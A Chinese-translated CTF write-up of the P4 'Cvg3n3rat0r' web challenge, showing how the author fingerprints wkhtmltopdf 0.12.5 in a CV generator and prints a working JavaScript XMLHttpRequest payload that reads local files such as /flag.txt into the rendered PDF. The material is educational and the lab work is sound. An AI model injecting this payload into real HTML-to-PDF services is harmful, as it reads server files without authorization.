<html>
<head>
<title>P4 CTF: Cvg3n3rat0r</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">P4 CTF: Cvg3n3rat0r</h1>
<blockquote>原文：<a href="https://medium.com/codex/p4-ctf-cvg3n3rat0r-b687558978f3?source=collection_archive---------17-----------------------#2022-11-06">https://medium.com/codex/p4-ctf-cvg3n3rat0r-b687558978f3?source=collection_archive---------17-----------------------#2022-11-06</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/4b1cfae2bcf92addb44641d917f06fa0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fPUXgSfSoCBfsEAoK8Tluw.png"/></div></div></figure><p id="8eb4" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">这是我为p4 CTF的Cvg3n3rat0r网络开发挑战撰写的文章。在这个挑战中，我们需要检查一个CV生成器应用程序，寻找允许我们读取/flag.txt文件的漏洞。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es jo"><img src="../Images/c3ab748caa0f2f07b080de681f8732a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k33M4M3D8VOFA82RdmoI7Q.png"/></div></div></figure><p id="7026" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">首先，我们访问他们给我们的URL，我们看到唯一的功能是HTML到PDF的解析器。这种类型的系统通常在文件包含的管理方面存在问题。第一步是发现哪个库负责解析我们的输入。有了这些信息，我们应该能够知道语法以及库是否有一些已知的漏洞。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es jt"><img src="../Images/d4e4e07cdb233a576d287e15ecbe8525.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ukj1pD6OY8q97IxkTsUQlQ.png"/></div></div></figure><p id="900e" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">我们可以尝试用两种方法找出版本:通过引起错误(格式错误或未关闭的标签，大的或空的文件，等等。)或者通过查看它是否在元数据中留下任何允许我们识别库的信息。我们将生成一个PDF文件，并使用ExifTool实用程序来检查元数据泄漏。</p><pre class="jp jq jr js fd ju jv jw jx aw jy bi"><span id="2e2f" class="jz ka hi jv b fi kb kc l kd ke">exiftool CV.pdf</span></pre><p id="f248" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">从ExifTool的输出中，我们可以看到一个Creator属性，它告诉我们它正在使用0.12.5版本中的wkhtmltopdf。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div class="er es kf"><img src="../Images/3d8dbf556a8d6599f03877bcff63d43c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1032/format:webp/1*eM5pAmJj9XAv9Q6rEovtlA.png"/></div></figure><p id="f530" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">在Google上快速搜索我们现有的库版本，会返回几篇文章，解释如何通过滥用该功能来获得文件包含。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es kg"><img src="../Images/9f9db9fc4d2d6b9838dcc143e18d62fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T5lnhCPSIqp8GUMbqW7OrQ.png"/></div></div></figure><p id="4e7e" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">回顾这些帖子，我们看到了下面的有效负载，它允许我们读取/etc/passwd文件。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div class="er es kh"><img src="../Images/4e4093a67f583cdefbc76c9fdcc7fb92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*Xf0jjMl05PuIWu3wfavaKg.png"/></div></figure><p id="4b32" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">如果我们尝试在我们找到的解析器中使用它，我们将获得一个PDF文件，其中包含执行应用程序的系统的/etc/passwd文件的内容。文件包含已实现，但我们仍需读取标志。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es ki"><img src="../Images/28d3a54388dc063470cb5eb8c1268d2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0G_111rHcKCYz738nQoBQg.png"/></div></div></figure><p id="4190" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">文件包含已实现，但我们仍需读取标志。我们只需要稍微修改一下有效载荷，就可以读取“flag.txt”文件了。</p><pre class="jp jq jr js fd ju jv jw jx aw jy bi"><span id="e202" class="jz ka hi jv b fi kb kc l kd ke">&lt;script&gt;<br/>    x=new XMLHttpRequest;<br/>    x.onload=function(){  <br/>    document.write(this.responseText)<br/>};<br/>    x.open("GET","file:///flag.txt");<br/>    x.send();<br/>&lt;/script&gt;</span></pre><p id="5a04" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">现在，如果我们提交新的有效载荷，我们可以下载pdf文件来读取旗帜。</p><figure class="jp jq jr js fd ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es kj"><img src="../Images/4458de368b41ff18c5d48f32c4912ba3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sPf_3ji0qe5CHU3I3EO4Bw.png"/></div></div><figcaption class="kk kl et er es km kn bd b be z dx translated"><strong class="bd ko"> GG！</strong></figcaption></figure></div><div class="ab cl kp kq gp kr" role="separator"><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku kv"/><span class="ks bw bk kt ku"/></div><div class="hb hc hd he hf"><p id="656b" class="pw-post-body-paragraph iq ir hi is b it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn hb bi translated">我希望你喜欢我的文章，并发现我的内容有用。下一篇文章再见。</p></div></div>    
</body>
</html>